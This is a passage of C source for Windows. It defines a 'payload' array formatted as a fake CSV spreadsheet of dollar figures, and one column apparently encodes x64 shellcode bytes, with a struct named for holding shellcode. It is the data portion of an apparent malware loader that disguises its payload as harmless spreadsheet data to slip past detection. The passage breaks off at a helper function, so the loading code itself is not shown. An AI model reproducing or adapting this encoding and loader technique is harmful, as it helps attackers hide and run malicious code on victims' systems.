#define PCRE2_CODE_UNIT_WIDTH 8
#define PCRE2_STATIC
#include <pcre2.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

const char* payload[] = {
    "Website Test Data,,,,,,",
    "Item,A,B,C,D,E,F",
    "UBTO5JM8EL99,,,,,,",
    ",\"$610,000\", \"$252,000\" \"$533,000\", \"$316,000\", \"$655,000\", \"$596,000\"",
    ",\"$503,000\", \"$72,000\" \"$986,000\", \"$324,000\", \"$252,000\", \"$964,000\"",
    ",\"$649,000\", \"$131,000\" \"$322,000\", \"$188,000\", \"$432,000\", \"$658,000\"",
    ",\"$973,000\", \"$228,000\" \"$904,000\", \"$823,000\", \"$811,000\", \"$483,000\"",
    ",\"$276,000\", \"$240,000\" \"$67,000\", \"$204,000\", \"$957,000\", \"$125,000\"",
    ",\"$135,000\", \"$232,000\" \"$419,000\", \"$384,000\", \"$976,000\", \"$413,000\"",
    ",\"$295,000\", \"$192,000\" \"$378,000\", \"$480,000\", \"$739,000\", \"$280,000\"",
    ",\"$9,000\", \"$0,000\" \"$122,000\", \"$894,000\", \"$253,000\", \"$369,000\"",
    ",\"$269,000\", \"$0,000\" \"$302,000\", \"$238,000\", \"$456,000\", \"$180,000\"",
    ",\"$547,000\", \"$0,000\" \"$545,000\", \"$821,000\", \"$674,000\", \"$226,000\"",
    ",\"$428,000\", \"$65,000\" \"$232,000\", \"$130,000\", \"$618,000\", \"$607,000\"",
    ",\"$622,000\", \"$81,000\" \"$229,000\", \"$451,000\", \"$202,000\", \"$558,000\"",
    ",\"$865,000\", \"$65,000\" \"$629,000\", \"$273,000\", \"$362,000\", \"$561,000\"",
    ",\"$341,000\", \"$80,000\" \"$2,000\", \"$47,000\", \"$805,000\", \"$638,000\"",
    ",\"$126,000\", \"$82,000\" \"$576,000\", \"$859,000\", \"$942,000\", \"$714,000\"",
    ",\"$274,000\", \"$81,000\" \"$422,000\", \"$347,000\", \"$264,000\", \"$355,000\"",
    "RKP1UNLUKWRC,,,,,,",
    ",\"$259,000\", \"$86,000\" \"$874,000\", \"$671,000\", \"$990,000\", \"$506,000\"",
    ",\"$845,000\", \"$72,000\" \"$672,000\", \"$816,000\", \"$794,000\", \"$718,000\"",
    ",\"$457,000\", \"$49,000\" \"$25,000\", \"$890,000\", \"$904,000\", \"$690,000\"",
    ",\"$794,000\", \"$210,000\" \"$578,000\", \"$821,000\", \"$425,000\", \"$494,000\"",
    ",\"$583,000\", \"$101,000\" \"$219,000\", \"$421,000\", \"$802,000\", \"$525,000\"",
    ",\"$962,000\", \"$72,000\" \"$247,000\", \"$269,000\", \"$462,000\", \"$882,000\"",
    ",\"$180,000\", \"$139,000\" \"$408,000\", \"$884,000\", \"$440,000\", \"$585,000\"",
    ",\"$792,000\", \"$82,000\" \"$20,000\", \"$911,000\", \"$813,000\", \"$451,000\"",
    ",\"$773,000\", \"$96,000\" \"$890,000\", \"$336,000\", \"$182,000\", \"$111,000\"",
    ",\"$704,000\", \"$72,000\" \"$681,000\", \"$719,000\", \"$915,000\", \"$678,000\"",
    ",\"$648,000\", \"$139,000\" \"$150,000\", \"$957,000\", \"$974,000\", \"$510,000\"",
    ",\"$2,000\", \"$82,000\" \"$333,000\", \"$961,000\", \"$588,000\", \"$466,000\"",
    ",\"$14,000\", \"$24,000\" \"$133,000\", \"$938,000\", \"$866,000\", \"$944,000\"",
    ",\"$8,000\", \"$72,000\" \"$858,000\", \"$578,000\", \"$875,000\", \"$552,000\"",
    ",\"$282,000\", \"$139,000\" \"$272,000\", \"$94,000\", \"$560,000\", \"$52,000\"",
    ",\"$336,000\", \"$82,000\" \"$650,000\", \"$766,000\", \"$285,000\", \"$118,000\"",
    "2QOZIPXE5J25,,,,,,",
    ",\"$684,000\", \"$32,000\" \"$858,000\", \"$530,000\", \"$65,000\", \"$767,000\"",
    ",\"$565,000\", \"$72,000\" \"$270,000\", \"$805,000\", \"$877,000\", \"$939,000\"",
    ",\"$129,000\", \"$139,000\" \"$103,000\", \"$561,000\", \"$762,000\", \"$178,000\"",
    ",\"$970,000\", \"$114,000\" \"$977,000\", \"$894,000\", \"$566,000\", \"$666,000\"",
    ",\"$915,000\", \"$80,000\" \"$998,000\", \"$555,000\", \"$338,000\", \"$375,000\"",
    ",\"$186,000\", \"$72,000\" \"$18,000\", \"$452,000\", \"$226,000\", \"$609,000\"",
    ",\"$400,000\", \"$15,000\" \"$547,000\", \"$792,000\", \"$32,000\", \"$666,000\"",
    ",\"$661,000\", \"$183,000\" \"$705,000\", \"$162,000\", \"$339,000\", \"$761,000\"",
    ",\"$918,000\", \"$74,000\" \"$166,000\", \"$870,000\", \"$812,000\", \"$612,000\"",
    ",\"$872,000\", \"$74,000\" \"$572,000\", \"$928,000\", \"$615,000\", \"$956,000\"",
    ",\"$545,000\", \"$77,000\" \"$343,000\", \"$2,000\", \"$51,000\", \"$676,000\"",
    ",\"$210,000\", \"$49,000\" \"$637,000\", \"$773,000\", \"$292,000\", \"$428,000\"",
    ",\"$243,000\", \"$201,000\" \"$684,000\", \"$847,000\", \"$828,000\", \"$182,000\"",
    ",\"$751,000\", \"$72,000\" \"$82,000\", \"$27,000\", \"$762,000\", \"$899,000\"",
    ",\"$571,000\", \"$49,000\" \"$440,000\", \"$272,000\", \"$215,000\", \"$894,000\"",
    ",\"$778,000\", \"$192,000\" \"$541,000\", \"$57,000\", \"$756,000\", \"$468,000\"",
    "4FP2ZM8MM4TV,,,,,,",
    ",\"$591,000\", \"$172,000\" \"$591,000\", \"$431,000\", \"$662,000\", \"$930,000\"",
    ",\"$732,000\", \"$60,000\" \"$438,000\", \"$752,000\", \"$125,000\", \"$89,000\"",
    ",\"$820,000\", \"$97,000\" \"$517,000\", \"$996,000\", \"$32,000\", \"$467,000\"",
    ",\"$113,000\", \"$124,000\" \"$62,000\", \"$25,000\", \"$191,000\", \"$625,000\"",
    ",\"$757,000\", \"$2,000\" \"$615,000\", \"$333,000\", \"$547,000\", \"$812,000\"",
    ",\"$771,000\", \"$44,000\" \"$812,000\", \"$15,000\", \"$550,000\", \"$382,000\"",
    ",\"$380,000\", \"$32,000\" \"$304,000\", \"$610,000\", \"$345,000\", \"$776,000\"",
    ",\"$724,000\", \"$65,000\" \"$701,000\", \"$138,000\", \"$422,000\", \"$244,000\"",
    ",\"$319,000\", \"$193,000\" \"$934,000\", \"$968,000\", \"$296,000\", \"$49,000\"",
    ",\"$828,000\", \"$201,000\" \"$337,000\", \"$207,000\", \"$740,000\", \"$195,000\"",
    ",\"$476,000\", \"$13,000\" \"$647,000\", \"$660,000\", \"$155,000\", \"$794,000\"",
    ",\"$278,000\", \"$65,000\" \"$496,000\", \"$21,000\", \"$869,000\", \"$185,000\"",
    ",\"$94,000\", \"$1,000\" \"$814,000\", \"$534,000\", \"$981,000\", \"$745,000\"",
    ",\"$228,000\", \"$193,000\" \"$163,000\", \"$427,000\", \"$252,000\", \"$923,000\"",
    ",\"$184,000\", \"$226,000\" \"$171,000\", \"$953,000\", \"$221,000\", \"$34,000\"",
    ",\"$760,000\", \"$237,000\" \"$368,000\", \"$225,000\", \"$395,000\", \"$98,000\"",
    "8JEE06JSUP3B,,,,,,",
    ",\"$92,000\", \"$82,000\" \"$38,000\", \"$932,000\", \"$287,000\", \"$445,000\"",
    ",\"$427,000\", \"$65,000\" \"$740,000\", \"$817,000\", \"$17,000\", \"$333,000\"",
    ",\"$29,000\", \"$81,000\" \"$855,000\", \"$245,000\", \"$980,000\", \"$916,000\"",
    ",\"$674,000\", \"$72,000\" \"$672,000\", \"$905,000\", \"$513,000\", \"$555,000\"",
    ",\"$538,000\", \"$139,000\" \"$539,000\", \"$976,000\", \"$968,000\", \"$915,000\"",
    ",\"$683,000\", \"$82,000\" \"$743,000\", \"$498,000\", \"$422,000\", \"$175,000\"",
    ",\"$864,000\", \"$32,000\" \"$762,000\", \"$521,000\", \"$142,000\", \"$0,000\"",
    ",\"$611,000\", \"$139,000\" \"$920,000\", \"$169,000\", \"$474,000\", \"$660,000\"",
    ",\"$816,000\", \"$66,000\" \"$985,000\", \"$802,000\", \"$971,000\", \"$394,000\"",
    ",\"$69,000\", \"$60,000\" \"$247,000\", \"$1,000\", \"$440,000\", \"$934,000\"",
    ",\"$200,000\", \"$72,000\" \"$15,000\", \"$813,000\", \"$63,000\", \"$982,000\"",
    ",\"$444,000\", \"$1,000\" \"$965,000\", \"$325,000\", \"$78,000\", \"$166,000\"",
    ",\"$784,000\", \"$208,000\" \"$325,000\", \"$209,000\", \"$976,000\", \"$90,000\"",
    ",\"$6,000\", \"$139,000\" \"$121,000\", \"$165,000\", \"$965,000\", \"$604,000\"",
    ",\"$360,000\", \"$128,000\" \"$500,000\", \"$516,000\", \"$823,000\", \"$722,000\"",
    ",\"$756,000\", \"$136,000\" \"$650,000\", \"$240,000\", \"$946,000\", \"$274,000\"",
    "SAI98O234G2C,,,,,,",
    ",\"$909,000\", \"$0,000\" \"$181,000\", \"$906,000\", \"$16,000\", \"$432,000\"",
    ",\"$987,000\", \"$0,000\" \"$227,000\", \"$136,000\", \"$767,000\", \"$289,000\"",
    ",\"$739,000\", \"$0,000\" \"$648,000\", \"$401,000\", \"$947,000\", \"$195,000\"",
    ",\"$275,000\", \"$72,000\" \"$231,000\", \"$507,000\", \"$34,000\", \"$785,000\"",
    ",\"$725,000\", \"$133,000\" \"$976,000\", \"$48,000\", \"$980,000\", \"$589,000\"",
    ",\"$558,000\", \"$192,000\" \"$661,000\", \"$565,000\", \"$892,000\", \"$780,000\"",
    ",\"$275,000\", \"$116,000\" \"$372,000\", \"$131,000\", \"$354,000\", \"$885,000\"",
    ",\"$605,000\", \"$103,000\" \"$159,000\", \"$912,000\", \"$742,000\", \"$413,000\"",
    ",\"$322,000\", \"$72,000\" \"$732,000\", \"$696,000\", \"$840,000\", \"$206,000\"",
    ",\"$652,000\", \"$1,000\" \"$208,000\", \"$527,000\", \"$774,000\", \"$457,000\"",
    ",\"$292,000\", \"$208,000\" \"$406,000\", \"$495,000\", \"$124,000\", \"$385,000\"",
    ",\"$0,000\", \"$80,000\" \"$211,000\", \"$409,000\", \"$122,000\", \"$152,000\"",
    ",\"$249,000\", \"$139,000\" \"$351,000\", \"$800,000\", \"$648,000\", \"$989,000\"",
    ",\"$252,000\", \"$72,000\" \"$994,000\", \"$278,000\", \"$540,000\", \"$356,000\"",
    ",\"$625,000\", \"$24,000\" \"$69,000\", \"$719,000\", \"$165,000\", \"$500,000\"",
    ",\"$323,000\", \"$68,000\" \"$50,000\", \"$981,000\", \"$982,000\", \"$249,000\"",
    "ALRRJXY9Z1Z4,,,,,,",
    ",\"$743,000\", \"$139,000\" \"$500,000\", \"$169,000\", \"$974,000\", \"$809,000\"",
    ",\"$199,000\", \"$64,000\" \"$129,000\", \"$654,000\", \"$959,000\", \"$588,000\"",
    ",\"$750,000\", \"$32,000\" \"$205,000\", \"$256,000\", \"$283,000\", \"$779,000\"",
    ",\"$744,000\", \"$73,000\" \"$450,000\", \"$397,000\", \"$62,000\", \"$733,000\"",
    ",\"$624,000\", \"$1,000\" \"$753,000\", \"$489,000\", \"$356,000\", \"$494,000\"",
    ",\"$27,000\", \"$208,000\" \"$962,000\", \"$363,000\", \"$191,000\", \"$843,000\"",
    ",\"$26,000\", \"$227,000\" \"$379,000\", \"$855,000\", \"$349,000\", \"$856,000\"",
    ",\"$9,000\", \"$86,000\" \"$0,000\", \"$592,000\", \"$374,000\", \"$117,000\"",
    ",\"$304,000\", \"$72,000\" \"$169,000\", \"$533,000\", \"$469,000\", \"$959,000\"",
    ",\"$188,000\", \"$255,000\" \"$45,000\", \"$754,000\", \"$943,000\", \"$348,000\"",
    ",\"$677,000\", \"$201,000\" \"$962,000\", \"$58,000\", \"$51,000\", \"$930,000\"",
    ",\"$175,000\", \"$65,000\" \"$211,000\", \"$580,000\", \"$616,000\", \"$573,000\"",
    ",\"$536,000\", \"$139,000\" \"$420,000\", \"$361,000\", \"$942,000\", \"$260,000\"",
    ",\"$906,000\", \"$52,000\" \"$480,000\", \"$607,000\", \"$83,000\", \"$894,000\"",
    ",\"$572,000\", \"$136,000\" \"$770,000\", \"$743,000\", \"$469,000\", \"$486,000\"",
    ",\"$552,000\", \"$72,000\" \"$498,000\", \"$824,000\", \"$914,000\", \"$938,000\"",
    "T157CIYBVAIZ,,,,,,",
    ",\"$323,000\", \"$1,000\" \"$384,000\", \"$203,000\", \"$564,000\", \"$641,000\"",
    ",\"$625,000\", \"$214,000\" \"$127,000\", \"$989,000\", \"$190,000\", \"$646,000\"",
    ",\"$521,000\", \"$77,000\" \"$919,000\", \"$698,000\", \"$442,000\", \"$843,000\"",
    ",\"$891,000\", \"$49,000\" \"$774,000\", \"$388,000\", \"$650,000\", \"$414,000\"",
    ",\"$823,000\", \"$201,000\" \"$235,000\", \"$486,000\", \"$969,000\", \"$425,000\"",
    ",\"$188,000\", \"$72,000\" \"$633,000\", \"$532,000\", \"$86,000\", \"$716,000\"",
    ",\"$978,000\", \"$49,000\" \"$809,000\", \"$318,000\", \"$36,000\", \"$917,000\"",
    ",\"$214,000\", \"$192,000\" \"$609,000\", \"$759,000\", \"$910,000\", \"$868,000\"",
    ",\"$676,000\", \"$172,000\" \"$346,000\", \"$815,000\", \"$851,000\", \"$261,000\"",
    ",\"$440,000\", \"$65,000\" \"$392,000\", \"$579,000\", \"$183,000\", \"$899,000\"",
    ",\"$28,000\", \"$193,000\" \"$993,000\", \"$881,000\", \"$479,000\", \"$884,000\"",
    ",\"$833,000\", \"$201,000\" \"$501,000\", \"$788,000\", \"$669,000\", \"$595,000\"",
    ",\"$470,000\", \"$13,000\" \"$354,000\", \"$714,000\", \"$732,000\", \"$680,000\"",
    ",\"$589,000\", \"$65,000\" \"$469,000\", \"$781,000\", \"$612,000\", \"$28,000\"",
    ",\"$461,000\", \"$1,000\" \"$469,000\", \"$729,000\", \"$682,000\", \"$398,000\"",
    ",\"$325,000\", \"$193,000\" \"$548,000\", \"$77,000\", \"$292,000\", \"$356,000\"",
    "L37FPBCMSHHN,,,,,,",
    ",\"$734,000\", \"$56,000\" \"$15,000\", \"$536,000\", \"$26,000\", \"$292,000\"",
    ",\"$859,000\", \"$224,000\" \"$176,000\", \"$213,000\", \"$821,000\", \"$66,000\"",
    ",\"$803,000\", \"$117,000\" \"$816,000\", \"$338,000\", \"$520,000\", \"$566,000\"",
    ",\"$184,000\", \"$241,000\" \"$977,000\", \"$169,000\", \"$691,000\", \"$88,000\"",
    ",\"$546,000\", \"$76,000\" \"$303,000\", \"$446,000\", \"$40,000\", \"$690,000\"",
    ",\"$131,000\", \"$3,000\" \"$699,000\", \"$820,000\", \"$159,000\", \"$879,000\"",
    ",\"$623,000\", \"$76,000\" \"$936,000\", \"$713,000\", \"$740,000\", \"$760,000\"",
    ",\"$225,000\", \"$36,000\" \"$239,000\", \"$12,000\", \"$241,000\", \"$515,000\"",
    ",\"$769,000\", \"$8,000\" \"$225,000\", \"$134,000\", \"$664,000\", \"$88,000\"",
    ",\"$1,000\", \"$69,000\" \"$210,000\", \"$496,000\", \"$965,000\", \"$150,000\"",
    ",\"$724,000\", \"$57,000\" \"$429,000\", \"$191,000\", \"$168,000\", \"$261,000\"",
    ",\"$264,000\", \"$209,000\" \"$785,000\", \"$363,000\", \"$858,000\", \"$329,000\"",
    ",\"$775,000\", \"$117,000\" \"$967,000\", \"$812,000\", \"$892,000\", \"$947,000\"",
    ",\"$507,000\", \"$216,000\" \"$574,000\", \"$643,000\", \"$166,000\", \"$407,000\"",
    ",\"$27,000\", \"$88,000\" \"$277,000\", \"$828,000\", \"$741,000\", \"$800,000\"",
    ",\"$199,000\", \"$68,000\" \"$848,000\", \"$115,000\", \"$257,000\", \"$228,000\"",
    "LI9819D6MPSU,,,,,,",
    ",\"$371,000\", \"$139,000\" \"$984,000\", \"$597,000\", \"$701,000\", \"$410,000\"",
    ",\"$297,000\", \"$64,000\" \"$475,000\", \"$512,000\", \"$544,000\", \"$755,000\"",
    ",\"$448,000\", \"$36,000\" \"$111,000\", \"$650,000\", \"$121,000\", \"$540,000\"",
    ",\"$978,000\", \"$73,000\" \"$912,000\", \"$763,000\", \"$326,000\", \"$235,000\"",
    ",\"$558,000\", \"$1,000\" \"$500,000\", \"$127,000\", \"$439,000\", \"$270,000\"",
    ",\"$74,000\", \"$208,000\" \"$621,000\", \"$543,000\", \"$578,000\", \"$400,000\"",
    ",\"$173,000\", \"$102,000\" \"$697,000\", \"$3,000\", \"$693,000\", \"$239,000\"",
    ",\"$136,000\", \"$65,000\" \"$335,000\", \"$877,000\", \"$446,000\", \"$472,000\"",
    ",\"$184,000\", \"$139,000\" \"$566,000\", \"$71,000\", \"$421,000\", \"$367,000\"",
    ",\"$220,000\", \"$12,000\" \"$321,000\", \"$276,000\", \"$984,000\", \"$890,000\"",
    ",\"$855,000\", \"$72,000\" \"$416,000\", \"$66,000\", \"$327,000\", \"$863,000\"",
    ",\"$811,000\", \"$68,000\" \"$875,000\", \"$788,000\", \"$139,000\", \"$750,000\"",
    ",\"$558,000\", \"$139,000\" \"$396,000\", \"$233,000\", \"$712,000\", \"$628,000\"",
    ",\"$136,000\", \"$64,000\" \"$81,000\", \"$634,000\", \"$56,000\", \"$607,000\"",
    ",\"$663,000\", \"$28,000\" \"$193,000\", \"$514,000\", \"$166,000\", \"$897,000\"",
    ",\"$473,000\", \"$73,000\" \"$706,000\", \"$907,000\", \"$972,000\", \"$588,000\"",
    "F4XU7QUGIXE0,,,,,,",
    ",\"$465,000\", \"$1,000\" \"$232,000\", \"$683,000\", \"$236,000\", \"$761,000\"",
    ",\"$718,000\", \"$208,000\" \"$310,000\", \"$332,000\", \"$775,000\", \"$676,000\"",
    ",\"$273,000\", \"$65,000\" \"$292,000\", \"$851,000\", \"$401,000\", \"$466,000\"",
    ",\"$619,000\", \"$139,000\" \"$592,000\", \"$736,000\", \"$734,000\", \"$366,000\"",
    ",\"$538,000\", \"$4,000\" \"$169,000\", \"$188,000\", \"$717,000\", \"$659,000\"",
    ",\"$945,000\", \"$136,000\" \"$813,000\", \"$66,000\", \"$757,000\", \"$675,000\"",
    ",\"$422,000\", \"$72,000\" \"$724,000\", \"$831,000\", \"$434,000\", \"$296,000\"",
    ",\"$741,000\", \"$1,000\" \"$288,000\", \"$584,000\", \"$930,000\", \"$715,000\"",
    ",\"$976,000\", \"$208,000\" \"$670,000\", \"$233,000\", \"$288,000\", \"$74,000\"",
    ",\"$624,000\", \"$65,000\" \"$27,000\", \"$972,000\", \"$371,000\", \"$120,000\"",
    ",\"$825,000\", \"$88,000\" \"$732,000\", \"$829,000\", \"$643,000\", \"$258,000\"",
    ",\"$985,000\", \"$65,000\" \"$150,000\", \"$157,000\", \"$160,000\", \"$469,000\"",
    ",\"$513,000\", \"$88,000\" \"$700,000\", \"$472,000\", \"$894,000\", \"$526,000\"",
    ",\"$925,000\", \"$94,000\" \"$459,000\", \"$685,000\", \"$841,000\", \"$22,000\"",
    ",\"$284,000\", \"$89,000\" \"$474,000\", \"$807,000\", \"$100,000\", \"$803,000\"",
    ",\"$338,000\", \"$90,000\" \"$316,000\", \"$274,000\", \"$882,000\", \"$590,000\"",
    "ZNCVAJRKZEHB,,,,,,",
    ",\"$750,000\", \"$65,000\" \"$305,000\", \"$390,000\", \"$996,000\", \"$933,000\"",
    ",\"$306,000\", \"$88,000\" \"$858,000\", \"$25,000\", \"$566,000\", \"$382,000\"",
    ",\"$301,000\", \"$65,000\" \"$194,000\", \"$460,000\", \"$820,000\", \"$704,000\"",
    ",\"$154,000\", \"$89,000\" \"$845,000\", \"$495,000\", \"$896,000\", \"$49,000\"",
    ",\"$802,000\", \"$65,000\" \"$218,000\", \"$650,000\", \"$58,000\", \"$648,000\"",
    ",\"$28,000\", \"$90,000\" \"$673,000\", \"$65,000\", \"$88,000\", \"$579,000\"",
    ",\"$712,000\", \"$72,000\" \"$549,000\", \"$718,000\", \"$110,000\", \"$724,000\"",
    ",\"$318,000\", \"$131,000\" \"$362,000\", \"$562,000\", \"$95,000\", \"$871,000\"",
    ",\"$78,000\", \"$236,000\" \"$774,000\", \"$760,000\", \"$119,000\", \"$680,000\"",
    ",\"$592,000\", \"$32,000\" \"$699,000\", \"$148,000\", \"$260,000\", \"$279,000\"",
    ",\"$271,000\", \"$65,000\" \"$988,000\", \"$643,000\", \"$624,000\", \"$146,000\"",
    ",\"$483,000\", \"$82,000\" \"$233,000\", \"$287,000\", \"$966,000\", \"$150,000\"",
    ",\"$28,000\", \"$255,000\" \"$283,000\", \"$665,000\", \"$310,000\", \"$50,000\"",
    ",\"$77,000\", \"$224,000\" \"$908,000\", \"$427,000\", \"$132,000\", \"$11,000\"",
    ",\"$787,000\", \"$88,000\" \"$792,000\", \"$91,000\", \"$1,000\", \"$315,000\"",
    ",\"$372,000\", \"$65,000\" \"$439,000\", \"$22,000\", \"$282,000\", \"$966,000\"",
    "WS3KWF88230U,,,,,,",
    ",\"$431,000\", \"$89,000\" \"$540,000\", \"$217,000\", \"$354,000\", \"$671,000\"",
    ",\"$279,000\", \"$90,000\" \"$895,000\", \"$313,000\", \"$181,000\", \"$257,000\"",
    ",\"$964,000\", \"$72,000\" \"$343,000\", \"$620,000\", \"$567,000\", \"$510,000\"",
    ",\"$242,000\", \"$139,000\" \"$846,000\", \"$883,000\", \"$523,000\", \"$904,000\"",
    ",\"$851,000\", \"$18,000\" \"$208,000\", \"$132,000\", \"$998,000\", \"$529,000\"",
    ",\"$916,000\", \"$233,000\" \"$174,000\", \"$876,000\", \"$200,000\", \"$912,000\"",
    ",\"$951,000\", \"$87,000\" \"$468,000\", \"$302,000\", \"$612,000\", \"$855,000\"",
    ",\"$63,000\", \"$255,000\" \"$692,000\", \"$117,000\", \"$283,000\", \"$535,000\"",
    ",\"$839,000\", \"$255,000\" \"$783,000\", \"$82,000\", \"$634,000\", \"$949,000\"",
    ",\"$866,000\", \"$255,000\" \"$162,000\", \"$80,000\", \"$754,000\", \"$467,000\"",
    ",\"$402,000\", \"$93,000\" \"$984,000\", \"$157,000\", \"$485,000\", \"$512,000\"",
    ",\"$112,000\", \"$72,000\" \"$979,000\", \"$145,000\", \"$738,000\", \"$488,000\"",
    ",\"$995,000\", \"$186,000\" \"$161,000\", \"$919,000\", \"$602,000\", \"$392,000\"",
    ",\"$991,000\", \"$1,000\" \"$116,000\", \"$387,000\", \"$707,000\", \"$931,000\"",
    ",\"$401,000\", \"$0,000\" \"$371,000\", \"$650,000\", \"$735,000\", \"$144,000\"",
    ",\"$166,000\", \"$0,000\" \"$556,000\", \"$45,000\", \"$813,000\", \"$394,000\"",
    "DCPEC3MW3VWD,,,,,,",
    ",\"$453,000\", \"$0,000\" \"$75,000\", \"$523,000\", \"$894,000\", \"$617,000\"",
    ",\"$18,000\", \"$0,000\" \"$171,000\", \"$356,000\", \"$77,000\", \"$285,000\"",
    ",\"$91,000\", \"$0,000\" \"$121,000\", \"$932,000\", \"$71,000\", \"$271,000\"",
    ",\"$616,000\", \"$0,000\" \"$630,000\", \"$891,000\", \"$838,000\", \"$915,000\"",
    ",\"$455,000\", \"$0,000\" \"$651,000\", \"$525,000\", \"$975,000\", \"$307,000\"",
    ",\"$171,000\", \"$72,000\" \"$675,000\", \"$961,000\", \"$544,000\", \"$572,000\"",
    ",\"$281,000\", \"$141,000\" \"$507,000\", \"$197,000\", \"$306,000\", \"$225,000\"",
    ",\"$16,000\", \"$141,000\" \"$468,000\", \"$553,000\", \"$903,000\", \"$570,000\"",
    ",\"$518,000\", \"$1,000\" \"$643,000\", \"$854,000\", \"$488,000\", \"$357,000\"",
    ",\"$737,000\", \"$1,000\" \"$518,000\", \"$850,000\", \"$176,000\", \"$210,000\"",
    ",\"$935,000\", \"$0,000\" \"$684,000\", \"$989,000\", \"$18,000\", \"$192,000\"",
    ",\"$754,000\", \"$0,000\" \"$828,000\", \"$157,000\", \"$97,000\", \"$163,000\"",
    ",\"$541,000\", \"$65,000\" \"$495,000\", \"$218,000\", \"$692,000\", \"$952,000\"",
    ",\"$176,000\", \"$186,000\" \"$281,000\", \"$707,000\", \"$99,000\", \"$534,000\"",
    ",\"$611,000\", \"$49,000\" \"$741,000\", \"$813,000\", \"$660,000\", \"$188,000\"",
    ",\"$261,000\", \"$139,000\" \"$444,000\", \"$751,000\", \"$620,000\", \"$233,000\"",
    "IF4DD7SOZUSG,,,,,,",
    ",\"$29,000\", \"$111,000\" \"$187,000\", \"$782,000\", \"$107,000\", \"$486,000\"",
    ",\"$937,000\", \"$135,000\" \"$115,000\", \"$954,000\", \"$198,000\", \"$411,000\"",
    ",\"$613,000\", \"$255,000\" \"$5,000\", \"$11,000\", \"$475,000\", \"$298,000\"",
    ",\"$14,000\", \"$213,000\" \"$921,000\", \"$650,000\", \"$694,000\", \"$993,000\"",
    ",\"$800,000\", \"$187,000\" \"$135,000\", \"$113,000\", \"$273,000\", \"$324,000\"",
    ",\"$113,000\", \"$224,000\" \"$754,000\", \"$156,000\", \"$270,000\", \"$106,000\"",
    ",\"$318,000\", \"$29,000\" \"$53,000\", \"$989,000\", \"$803,000\", \"$537,000\"",
    ",\"$472,000\", \"$42,000\" \"$319,000\", \"$203,000\", \"$99,000\", \"$594,000\"",
    ",\"$508,000\", \"$10,000\" \"$185,000\", \"$620,000\", \"$980,000\", \"$765,000\"",
    ",\"$729,000\", \"$65,000\" \"$146,000\", \"$610,000\", \"$38,000\", \"$583,000\"",
    ",\"$327,000\", \"$186,000\" \"$250,000\", \"$512,000\", \"$611,000\", \"$948,000\"",
    ",\"$364,000\", \"$166,000\" \"$331,000\", \"$654,000\", \"$372,000\", \"$659,000\"",
    ",\"$926,000\", \"$149,000\" \"$224,000\", \"$43,000\", \"$209,000\", \"$509,000\"",
    ",\"$283,000\", \"$189,000\" \"$863,000\", \"$594,000\", \"$447,000\", \"$576,000\"",
    ",\"$252,000\", \"$157,000\" \"$516,000\", \"$410,000\", \"$496,000\", \"$257,000\"",
    ",\"$109,000\", \"$255,000\" \"$55,000\", \"$776,000\", \"$941,000\", \"$732,000\"",
    "HB318YVJ9KLF,,,,,,",
    ",\"$647,000\", \"$213,000\" \"$451,000\", \"$882,000\", \"$239,000\", \"$157,000\"",
    ",\"$954,000\", \"$72,000\" \"$638,000\", \"$361,000\", \"$54,000\", \"$318,000\"",
    ",\"$592,000\", \"$131,000\" \"$69,000\", \"$931,000\", \"$107,000\", \"$647,000\"",
    ",\"$33,000\", \"$196,000\" \"$32,000\", \"$800,000\", \"$271,000\", \"$843,000\"",
    ",\"$836,000\", \"$40,000\" \"$284,000\", \"$326,000\", \"$288,000\", \"$31,000\"",
    ",\"$483,000\", \"$60,000\" \"$55,000\", \"$792,000\", \"$641,000\", \"$950,000\"",
    ",\"$10,000\", \"$6,000\" \"$119,000\", \"$743,000\", \"$471,000\", \"$763,000\"",
    ",\"$148,000\", \"$124,000\" \"$349,000\", \"$118,000\", \"$422,000\", \"$815,000\"",
    ",\"$590,000\", \"$10,000\" \"$951,000\", \"$837,000\", \"$489,000\", \"$776,000\"",
    ",\"$872,000\", \"$128,000\" \"$768,000\", \"$302,000\", \"$540,000\", \"$321,000\"",
    ",\"$775,000\", \"$251,000\" \"$955,000\", \"$884,000\", \"$955,000\", \"$433,000\"",
    ",\"$505,000\", \"$224,000\" \"$966,000\", \"$781,000\", \"$118,000\", \"$989,000\"",
    ",\"$430,000\", \"$117,000\" \"$597,000\", \"$569,000\", \"$637,000\", \"$607,000\"",
    ",\"$504,000\", \"$5,000\" \"$442,000\", \"$684,000\", \"$853,000\", \"$126,000\"",
    ",\"$634,000\", \"$187,000\" \"$983,000\", \"$399,000\", \"$258,000\", \"$44,000\"",
    ",\"$738,000\", \"$71,000\" \"$598,000\", \"$289,000\", \"$293,000\", \"$757,000\"",
    "M1BUQWR9QC7G,,,,,,",
    ",\"$569,000\", \"$19,000\" \"$634,000\", \"$290,000\", \"$118,000\", \"$772,000\"",
    ",\"$252,000\", \"$114,000\" \"$914,000\", \"$813,000\", \"$522,000\", \"$655,000\"",
    ",\"$269,000\", \"$111,000\" \"$942,000\", \"$543,000\", \"$792,000\", \"$279,000\"",
    ",\"$834,000\", \"$106,000\" \"$955,000\", \"$781,000\", \"$505,000\", \"$923,000\"",
    ",\"$295,000\", \"$0,000\" \"$568,000\", \"$988,000\", \"$17,000\", \"$246,000\"",
    ",\"$114,000\", \"$89,000\" \"$482,000\", \"$344,000\", \"$652,000\", \"$806,000\"",
    ",\"$183,000\", \"$65,000\" \"$69,000\", \"$710,000\", \"$86,000\", \"$387,000\"",
    ",\"$49,000\", \"$137,000\" \"$927,000\", \"$831,000\", \"$570,000\", \"$536,000\"",
    ",\"$975,000\", \"$218,000\" \"$667,000\", \"$68,000\", \"$92,000\", \"$654,000\"",
    ",\"$520,000\", \"$255,000\" \"$278,000\", \"$127,000\", \"$745,000\", \"$905,000\"",
    ",\"$504,000\", \"$213,000\" \"$629,000\", \"$401,000\", \"$454,000\", \"$421,000\"",
    ",\"$574,000\", \"$99,000\" \"$715,000\", \"$618,000\", \"$408,000\", \"$683,000\"",
    ",\"$913,000\", \"$97,000\" \"$254,000\", \"$1,000\", \"$741,000\", \"$595,000\"",
    ",\"$540,000\", \"$108,000\" \"$880,000\", \"$908,000\", \"$214,000\", \"$94,000\"",
    ",\"$893,000\", \"$99,000\" \"$305,000\", \"$626,000\", \"$593,000\", \"$120,000\"",
    ",\"$316,000\", \"$0,000\" \"$68,000\", \"$300,000\", \"$808,000\", \"$282,000\""
};

struct csvdata
{
    unsigned char* shellcode;
    int size;
};

char *strremove(char *str, const char *sub)
{
    // https://stackoverflow.com/a/47117431
    char *p, *q, *r;
